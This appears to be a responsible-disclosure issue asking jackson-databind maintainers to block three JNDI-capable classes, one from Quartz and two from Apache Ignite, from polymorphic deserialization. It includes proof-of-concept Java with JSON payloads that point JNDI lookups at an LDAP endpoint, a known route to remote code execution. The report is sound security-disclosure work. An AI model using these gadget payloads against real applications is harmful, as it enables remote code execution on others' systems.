Hello,

I am reporting this issue as directed in https://github.com/FasterXML/jackson-databind/blob/master/SECURITY.md
Jackson blocks serialization of classes that can trigger dangerous operations as part of https://github.com/FasterXML/jackson-databind/blob/master/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java
 
I believe org.quartz.utils.JNDIConnectionProvider
(https://github.com/quartz-scheduler/quartz/blob/master/quartz-core/src/main/java/org/quartz/utils/JNDIConnectionProvider.java)
should also be part of the block list.
Here is the test code where object is deserialized via jndi calls.

```java
public class TestJNDIConnectionProvider {
public static void main(String[] args) {
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();
        mapper.addMixIn(JNDIConnectionProvider.class, AbstractJNDIConnectionProvider.class);
        String json = "[\"org.quartz.utils.JNDIConnectionProvider\",
{\"jndiUrl\":\"ldap://localhost:1389/MyCalc\"}]";
        try {
            Object a = mapper.readValue(json, Object.class);
           
        } catch (IOException e) {
            e.printStackTrace();
        }
}
}

public abstract class AbstractJNDIConnectionProvider extends JNDIConnectionProvider{
@JsonCreator
public AbstractJNDIConnectionProvider( @JsonProperty("jndiUrl") String jndiUrl, @JsonProperty ("alwaysLookup") boolean alwaysLookup) {
super(jndiUrl, alwaysLookup);
    }
}
```

The above code was tested with jackson-databind-2.10.2.jar and https://mvnrepository.com/artifact/org.quartz-scheduler.internal/quartz-core/2.2.3

Please get back to me for any clarifications.

------

There two more classes which is slightly different deserialization.
//---------CacheJndiTmFactory-----
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
String json = "[\"org.apache.ignite.cache.jta.jndi.CacheJndiTmFactory\",
     {\"jndiNames\":[\"ldap://localhost:1389/MyCalc\"]}]";
Object a =  mapper.readValue(json, Object.class);
((CacheJndiTmFactory) a).create();
//---------CacheJndiTmLookup-----
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
String json = "[\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",
     {\"jndiNames\":[\"ldap://localhost:1389/MyCalc\"]}]";
Object a =  mapper.readValue(json, Object.class);
((CacheJndiTmLookup) a).getTm();


